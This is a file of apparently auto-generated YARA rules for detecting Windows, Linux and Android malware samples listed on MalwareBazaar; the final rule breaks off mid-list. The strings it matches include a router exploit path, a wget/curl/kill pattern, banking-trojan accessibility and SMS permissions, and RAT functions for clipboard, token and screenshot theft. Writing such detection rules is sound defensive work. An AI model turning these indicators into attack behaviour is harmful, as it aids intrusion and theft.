rule Windows_ccf9ab5f39684f978982e061fe87aacf71bca2b411f8a6e55d776bdc032b36d7
{
    meta:
        description = "Auto ML: ccf9ab5f39684f978982e061fe87aacf71bca2b411f8a6e55d776bdc032b36d7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s7 = "GetTempPath2W"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "no such process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1474KB and
        all of them
}

rule Linux_cd10ab58c8cb5119d76ebba24a76835da97587461b1b1f69dcb4dd5d93aff460
{
    meta:
        description = "Auto ML: cd10ab58c8cb5119d76ebba24a76835da97587461b1b1f69dcb4dd5d93aff460"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 85KB and
        all of them
}

rule Windows_cd2cc1403cb829e7d7454a3a80d9875834bd3b0837e56493369f2d842bf3f569
{
    meta:
        description = "Auto ML: cd2cc1403cb829e7d7454a3a80d9875834bd3b0837e56493369f2d842bf3f569"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "<Module>"
        $s4 = "System.IO"
        $s5 = "System.Collections.Generic"
        $s6 = "Read"
        $s7 = "Load"
        $s8 = "GetTypeFromHandle"
        $s9 = "GetType"
        $s10 = "System.Core"
        $s11 = "ApplicationSettingsBase"
        $s12 = "CreateDelegate"
        $s13 = "TargetFrameworkAttribute"
        $s14 = "AssemblyFileVersionAttribute"
        $s15 = "Upammidsli.exe"
        $s16 = "System.Runtime.Versioning"
        $s17 = "System"
        $s18 = "System.IO.Compression"
        $s19 = "System.Configuration"
        $s20 = "System.Reflection"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 632KB and
        all of them
}

rule Windows_14b900286ac776a901ff3beb49507b83cb7902276d51c011360f837669ba7a66
{
    meta:
        description = "Auto ML: 14b900286ac776a901ff3beb49507b83cb7902276d51c011360f837669ba7a66"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "background_widget_for_quick_notification"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System"
        $s7 = "System.Diagnostics"
        $s8 = "System.Reflection"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "System.Security"
        $s14 = "SecurityRuleSet"
        $s15 = "background_widget_for_quick_notification.exe"
        $s16 = "<Module>"
        $s17 = "background_widget_for_quick_notification.My"
        $s18 = "ThreadSafeObjectProvider`1"
        $s19 = "background_widget_for_quick_notification.My.Resources"
        $s20 = "MySettings"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6333KB and
        all of them
}

rule Windows_cd2e465d6a7fabbdb606645b710f24e2c3fbeb0860dc5e9d5d14f24e06e80c12
{
    meta:
        description = "Auto ML: cd2e465d6a7fabbdb606645b710f24e2c3fbeb0860dc5e9d5d14f24e06e80c12"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Core"
        $s13 = "System.Windows.Markup"
        $s14 = "System.Xaml"
        $s15 = "System.Diagnostics.CodeAnalysis"
        $s16 = "System.Security"
        $s17 = "SecurityRuleSet"
        $s18 = "community_from_a_psychology_event.exe"
        $s19 = "<Module>"
        $s20 = "ThreadSafeObjectProvider`1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3811KB and
        all of them
}

rule Linux_cd389d7b7ca50eab09b8937f99b9b801664361a7fc6db8fc31e9eef8bac3bad6
{
    meta:
        description = "Auto ML: cd389d7b7ca50eab09b8937f99b9b801664361a7fc6db8fc31e9eef8bac3bad6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "(wget|curl|grep|pkill|kill|killall)"
        $s4 = "/proc/self/cmdline"
        $s5 = "No such file or directory"
        $s6 = "No such process"
        $s7 = "Interrupted system call"
        $s8 = "Bad file descriptor"
        $s9 = "No child processes"
        $s10 = "Resource temporarily unavailable"
        $s11 = "File exists"
        $s12 = "Too many open files in system"
        $s13 = "Too many open files"
        $s14 = "Text file busy"
        $s15 = "File too large"
        $s16 = "Read-only file system"
        $s17 = "File name too long"
        $s18 = "Level 3 reset"
        $s19 = "Bad font file format"
        $s20 = "Multihop attempted"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 86KB and
        all of them
}

rule Windows_cd4237029b627009d33bfcf33c18bb7823625d3ba56632196d239bcc03240b69
{
    meta:
        description = "Auto ML: cd4237029b627009d33bfcf33c18bb7823625d3ba56632196d239bcc03240b69"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4009KB and
        all of them
}

rule Linux_cd7082b1698cc23b04f5dcdac78a0ef1852c4629a0cd8491dba84545090baef1
{
    meta:
        description = "Auto ML: cd7082b1698cc23b04f5dcdac78a0ef1852c4629a0cd8491dba84545090baef1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB and
        all of them
}

rule Linux_cd8d3169c05096ae7cd78a155cf8953d6c809c4276b0517c5f783c6a8b0ed868
{
    meta:
        description = "Auto ML: cd8d3169c05096ae7cd78a155cf8953d6c809c4276b0517c5f783c6a8b0ed868"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/bin/systemd"
        $s7 = "GET /%s HTTP/1.0"
        $s8 = "User-Agent: Update v1.0"
        $s9 = "No such file or directory"
        $s10 = "No such process"
        $s11 = "Interrupted system call"
        $s12 = "Bad file descriptor"
        $s13 = "No child processes"
        $s14 = "Resource temporarily unavailable"
        $s15 = "File exists"
        $s16 = "Too many open files in system"
        $s17 = "Too many open files"
        $s18 = "Text file busy"
        $s19 = "File too large"
        $s20 = "Read-only file system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 82KB and
        all of them
}

rule Windows_cdc07215534b2a013cc2ab666d9a37eaebf478aa389489416159fd7034c2670d
{
    meta:
        description = "Auto ML: cdc07215534b2a013cc2ab666d9a37eaebf478aa389489416159fd7034c2670d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "System.Windows.Forms.ImageListStreamer, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089PADPADPD$"
        $s6 = "WSystem.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        $s7 = "&System.Windows.Forms.ImageListStreamer"
        $s8 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s9 = "System.Drawing.Bitmap"
        $s10 = "9iCCPPhotoshop ICC profile"
        $s11 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD"
        $s12 = "get_Panel1"
        $s13 = "get_Panel2"
        $s14 = "System.IO"
        $s15 = "System.Collections.Generic"
        $s16 = "add_Load"
        $s17 = "set_Enabled"
        $s18 = "get_IsDisposed"
        $s19 = "m_FormBeingCreated"
        $s20 = "set_IsSplitterFixed"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 915KB and
        all of them
}

rule Android_ce480d22d9936bc469d46abbcd51bdb74dc201216c29a97ba21c40e0299335bc
{
    meta:
        description = "Auto ML: ce480d22d9936bc469d46abbcd51bdb74dc201216c29a97ba21c40e0299335bc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "res/drawable/ic_settings.xml"
        $s2 = "!!res/drawable/ic_settings_main.xml"
        $s3 = "99Please enable Portal service under Accessibility settings"
        $s4 = "Settings"
        $s5 = "66Allow pop-up windows for the correct application work:"
        $s6 = "==Step 2 - Allow to display pop-up windows from background mode"
        $s7 = "GoogleReader"
        $s8 = "''Check in 'Downloaded Services' list: %s"
        $s9 = "reset"
        $s10 = "open"
        $s11 = "Go to settings"
        $s12 = "RREnable control over your battery usage. Press 'Activate' button in the next window"
        $s13 = "++Protected System component. Can't be viewed"
        $s14 = "!Step 2 - Open"
        $s15 = "\"&Step 3 - Open"
        $s16 = "cksetzen"
        $s17 = "Resetowanie"
        $s18 = "Resetovat"
        $s19 = "okhttp3/internal/publicsuffix/NOTICEM"
        $s20 = "assets/me_module_list"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 4252KB and
        all of them
}

rule Windows_ce87fbd823460dbdbb143117bf228723562f9bc20650565e28da5a9d21442087
{
    meta:
        description = "Auto ML: ce87fbd823460dbdbb143117bf228723562f9bc20650565e28da5a9d21442087"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "- unable to open console device"
        $s6 = "- unexpected multithread lock error"
        $s7 = "- not enough space for thread data"
        $s8 = "- floating point not loaded"
        $s9 = "GetLastActivePopup"
        $s10 = "GetActiveWindow"
        $s11 = "user32.dll"
        $s12 = "OLEAUT32.dll"
        $s13 = "ShowWindow"
        $s14 = "DestroyWindow"
        $s15 = "LoadStringA"
        $s16 = "LoadStringW"
        $s17 = "SetWindowTextA"
        $s18 = "SetWindowTextW"
        $s19 = "GetWindowLongA"
        $s20 = "SetWindowLongA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7427KB and
        all of them
}

rule Windows_cea47650f92e6b73107d0eddc5e8e66ac5725fe1a0002ddc38b4f500fd15dfed
{
    meta:
        description = "Auto ML: cea47650f92e6b73107d0eddc5e8e66ac5725fe1a0002ddc38b4f500fd15dfed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 337KB and
        all of them
}

rule Windows_cea50bb5162cb062f9c1bb03ce6a5d59b2247d0fbeec76e47948b1f90fe5f7cc
{
    meta:
        description = "Auto ML: cea50bb5162cb062f9c1bb03ce6a5d59b2247d0fbeec76e47948b1f90fe5f7cc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Microsoft.Win32"
        $s5 = "<Module>"
        $s6 = "System.IO"
        $s7 = "set_Verb"
        $s8 = "GetStringAsync"
        $s9 = "Thread"
        $s10 = "add_Load"
        $s11 = "set_FormattingEnabled"
        $s12 = "get_IsCompleted"
        $s13 = "ReadToEnd"
        $s14 = "RegistryValueKind"
        $s15 = "set_AutoScaleMode"
        $s16 = "GetTypeFromHandle"
        $s17 = "File"
        $s18 = "WindowsBuiltInRole"
        $s19 = "set_WindowStyle"
        $s20 = "ProcessWindowStyle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15KB and
        all of them
}

rule Windows_14bf7a5b4420073171f0cb75ee7f7bbab035ec7a0695ff0f1493c1a648f29a5b
{
    meta:
        description = "Auto ML: 14bf7a5b4420073171f0cb75ee7f7bbab035ec7a0695ff0f1493c1a648f29a5b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 208KB and
        all of them
}

rule Linux_ceac6a6ec5576991f92a6c4ab49122dc8370922b3aa89d94956e5037dae6c100
{
    meta:
        description = "Auto ML: ceac6a6ec5576991f92a6c4ab49122dc8370922b3aa89d94956e5037dae6c100"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB and
        all of them
}

rule Android_ceb48e4b9d82b2ab7b486393048cdc78c6dfaf88799521e63677b06975f707cd
{
    meta:
        description = "Auto ML: ceb48e4b9d82b2ab7b486393048cdc78c6dfaf88799521e63677b06975f707cd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "targetActivity"
        $s2 = "**http://schemas.android.com/apk/res/android"
        $s3 = "&&android.permission.SYSTEM_ALERT_WINDOW"
        $s4 = "((android.permission.MODIFY_AUDIO_SETTINGS"
        $s5 = "android.permission.WRITE_SMS"
        $s6 = "android.permission.READ_SMS"
        $s7 = "##android.permission.READ_PHONE_STATE"
        $s8 = "%%android.permission.READ_PHONE_NUMBERS"
        $s9 = "android.permission.READ_CONTACTS"
        $s10 = "))android.permission.WRITE_EXTERNAL_STORAGE"
        $s11 = "**android.permission.REQUEST_DELETE_PACKAGES"
        $s12 = "!!android.permission.WRITE_SETTINGS"
        $s13 = "((android.permission.READ_EXTERNAL_STORAGE"
        $s14 = "Settings"
        $s15 = "44com.grand.snail.bot.components.locker.LockerActivity"
        $s16 = "BBcom.grand.snail.bot.components.locker.LockerActivity$DummyActivity"
        $s17 = "..com.grand.snail.bot.HelperAdmin$MyHomeReceiver"
        $s18 = "FFcom.grand.snail.bot.components.injects.system.FullscreenOverlayService"
        $s19 = "11com.grand.snail.bot.components.commands.NLService"
        $s20 = "EEcom.grand.snail.bot.components.injects.system.InjAccessibilityService"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 1100KB and
        all of them
}

rule Windows_cec86acec6f99e92556452e64786682d8b76064ee7a2cc7515c44fae5297c1b6
{
    meta:
        description = "Auto ML: cec86acec6f99e92556452e64786682d8b76064ee7a2cc7515c44fae5297c1b6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "DeleteFileW"
        $s8 = "FindFirstFileW"
        $s9 = "FindNextFileW"
        $s10 = "FindClose"
        $s11 = "SetFilePointer"
        $s12 = "ReadFile"
        $s13 = "GetPrivateProfileStringW"
        $s14 = "WritePrivateProfileStringW"
        $s15 = "LoadLibraryExW"
        $s16 = "GetModuleHandleW"
        $s17 = "CloseHandle"
        $s18 = "SetFileTime"
        $s19 = "CompareFileTime"
        $s20 = "GetShortPathNameW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 72722KB and
        all of them
}

rule Windows_cedd6842dc8e5b7b943cba42c7b1229e71963dfc5c47c52165947adb1287248b
{
    meta:
        description = "Auto ML: cedd6842dc8e5b7b943cba42c7b1229e71963dfc5c47c52165947adb1287248b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 240KB and
        all of them
}

rule Windows_cf40f8b049aa15ac55b805f7bc7f34de484cff02cbbdbcdb174d32b20088c2d3
{
    meta:
        description = "Auto ML: cf40f8b049aa15ac55b805f7bc7f34de484cff02cbbdbcdb174d32b20088c2d3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".rdata"
        $s4 = "P.reloc"
        $s5 = "P.rsrc"
        $s6 = "System"
        $s7 = "kernel32.dll"
        $s8 = "GetLongPathNameA"
        $s9 = "Windows"
        $s10 = "TFileName"
        $s11 = "TFormatSettings"
        $s12 = "TThreadLocalCounter"
        $s13 = "$TMultiReadExclusiveWriteSynchronizer"
        $s14 = "GetDiskFreeSpaceExA"
        $s15 = "oleaut32.dll"
        $s16 = "VariantChangeTypeEx"
        $s17 = "EVariantArrayCreateError"
        $s18 = "IOleWindow"
        $s19 = "IOleInPlaceUIWindow"
        $s20 = "IDropTarget"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2080KB and
        all of them
}

rule Windows_cf51c50c01a1f91fd1dfbb0a4742ff9aad69417f0a7a95be0bb64d855b0dd5d9
{
    meta:
        description = "Auto ML: cf51c50c01a1f91fd1dfbb0a4742ff9aad69417f0a7a95be0bb64d855b0dd5d9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s4 = "ConsoleApp1.exe"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System"
        $s13 = "System.Threading"
        $s14 = "Process"
        $s15 = "FileInfo"
        $s16 = "System.IO"
        $s17 = "StreamWriter"
        $s18 = "ProcessStartInfo"
        $s19 = "System.Security.Cryptography"
        $s20 = "System.Management"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4333KB and
        all of them
}

rule Linux_cf96a7979bc2003dbdc1024fc9936e26e934ea289a083353a15e390e4371f1d6
{
    meta:
        description = "Auto ML: cf96a7979bc2003dbdc1024fc9936e26e934ea289a083353a15e390e4371f1d6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "/proc/%d/cmdline"
        $s5 = "wget"
        $s6 = "/usr/lib/systemd/systemd"
        $s7 = "shell"
        $s8 = "httpd"
        $s9 = "system"
        $s10 = "/usr/libexec/openssh/sftp-server"
        $s11 = "No such file or directory"
        $s12 = "No such process"
        $s13 = "Interrupted system call"
        $s14 = "Bad file descriptor"
        $s15 = "No child processes"
        $s16 = "Resource temporarily unavailable"
        $s17 = "File exists"
        $s18 = "Too many open files in system"
        $s19 = "Too many open files"
        $s20 = "Text file busy"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB and
        all of them
}

rule Windows_d0088d5fbd159e1d0c51bd9a069382acb3d246a5f94bcd19bcd32897b85d91c1
{
    meta:
        description = "Auto ML: d0088d5fbd159e1d0c51bd9a069382acb3d246a5f94bcd19bcd32897b85d91c1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "api-ms-win-crt-string-l1-1-0.dll"
        $s6 = "too many files"
        $s7 = "invalid filename"
        $s8 = "file too large"
        $s9 = "file not found"
        $s10 = "file stat failed"
        $s11 = "file open failed"
        $s12 = "file seek failed"
        $s13 = "write callback failed"
        $s14 = "file write failed"
        $s15 = "file create failed"
        $s16 = "file close failed"
        $s17 = "file read failed"
        $s18 = "Windows Vista"
        $s19 = "Windows Server 2008"
        $s20 = "Windows 8"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 580KB and
        all of them
}

rule Linux_d017b24236b688b833d99cf27b8782718acaa8a9ec56f0c59b3855e3a20b3f42
{
    meta:
        description = "Auto ML: d017b24236b688b833d99cf27b8782718acaa8a9ec56f0c59b3855e3a20b3f42"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 39KB and
        all of them
}

rule Windows_d05f38636d236314d40f22a27cddf777d00fb4fec5ee6d4fc569dba11e6f5861
{
    meta:
        description = "Auto ML: d05f38636d236314d40f22a27cddf777d00fb4fec5ee6d4fc569dba11e6f5861"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4758KB and
        all of them
}

rule Windows_150fb1285c252e2b79dea84efb28722cc22d370328ceb46fb9553de1479e001e
{
    meta:
        description = "Auto ML: 150fb1285c252e2b79dea84efb28722cc22d370328ceb46fb9553de1479e001e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "delete"
        $s7 = "delete[]"
        $s8 = "`placement delete closure'"
        $s9 = "`placement delete[] closure'"
        $s10 = "`local static thread guard'"
        $s11 = "FlsGetValue"
        $s12 = "FlsSetValue"
        $s13 = "CorExitProcess"
        $s14 = "AreFileApisANSI"
        $s15 = "AppPolicyGetProcessTerminationMethod"
        $s16 = ".text$di"
        $s17 = ".text$mn"
        $s18 = ".text$yd"
        $s19 = ".rdata"
        $s20 = ".rdata$r"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 102KB and
        all of them
}

rule Linux_d095a5f03d41cf3451aeb011b8ea46f1b0af1556d01cfee9b34c3df8b2fb483a
{
    meta:
        description = "Auto ML: d095a5f03d41cf3451aeb011b8ea46f1b0af1556d01cfee9b34c3df8b2fb483a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 46KB and
        all of them
}

rule Windows_d14a609c0c3757f80eec5475e599dd2804763620290a21076905d290524231a9
{
    meta:
        description = "Auto ML: d14a609c0c3757f80eec5475e599dd2804763620290a21076905d290524231a9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "<GetClipboard>d__40"
        $s4 = "<getprocs>d__60"
        $s5 = "<GetClipboard>b__0"
        $s6 = "<LoadDll>d__61"
        $s7 = "<get_cams>d__71"
        $s8 = "get_Item1"
        $s9 = "Microsoft.Win32"
        $s10 = "<get_tokens>d__72"
        $s11 = "<httpClient>5__2"
        $s12 = "get_Item2"
        $s13 = "<GetScreenshot>d__43"
        $s14 = "<httpClient>5__3"
        $s15 = "<ShellCommand>d__34"
        $s16 = "<Delete>d__44"
